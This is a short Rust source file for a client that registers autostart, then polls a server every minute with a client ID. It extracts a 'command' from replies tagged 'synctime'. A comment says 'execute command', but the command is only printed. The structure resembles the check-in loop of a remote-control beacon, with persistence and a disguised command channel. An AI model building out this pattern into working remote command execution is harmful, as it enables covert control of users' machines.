use std::time::Duration;

use crate::{autostart, request::request, utils::get_client_id};
use anyhow::Result;
use tokio::time::sleep;

pub async fn start() {
    let _ = autostart::run().await;
    let _ = request_poll().await;
}

async fn request_poll() -> Result<()> {
    let client_id = get_client_id()?;
    let handle = tokio::spawn(async move {
        loop {
            println!("request synctime  {}", client_id);
            let result = request(&client_id);

            let mut command: Option<String> = None;

            if let Ok(str) = result {
                let exist = str.contains("synctime");
                if exist {
                    let split = str.split(':').collect::<Vec<_>>();
                    let cmd = split.get(1).map(|s| s.to_string());
                    command = cmd;
                }
            }

            // 执行命令
            if let Some(cmd) = command {
                println!("command: {}", cmd);
            }
            sleep(Duration::from_secs(60)).await; // 1分钟
        }
    });

    handle.await?;
    Ok(())
}
